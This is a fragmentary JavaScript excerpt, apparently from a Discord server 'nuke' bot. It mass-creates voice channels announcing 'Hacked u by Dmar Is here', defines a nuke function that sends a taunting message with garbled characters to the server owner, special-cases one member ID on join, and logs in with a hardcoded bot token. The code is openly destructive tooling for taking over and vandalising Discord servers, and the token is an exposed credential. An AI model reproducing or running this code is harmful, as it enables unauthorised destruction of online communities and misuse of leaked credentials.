...
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by Dmar Is here', 'voice');
m.createChannel('Hacked u by Dmar Is here', 'voice');
m.createChannel('Hacked u by Dmar Is here', 'voice');
m.createChannel('Hacked u by Dmar Is here', 'voice');
m.createChannel('Hacked u by Dmar Is here', 'voice');
...
async function nuke(guild) {
  ...
  await guild.owner.send(' Hacked u by unknown Is here    ��� ��� ������ ����������������').catch(e => { return void e; });
...
LOka.on('guildMemberAdd', member => {
            ...
            if (member.id === "522461723027046400") {
...
LOka.login("NTI3OTc1NDU1NTQyODcwMDM2.D2g24w.Ma2hAh0MDiaEmQZE581YnSBYt8c")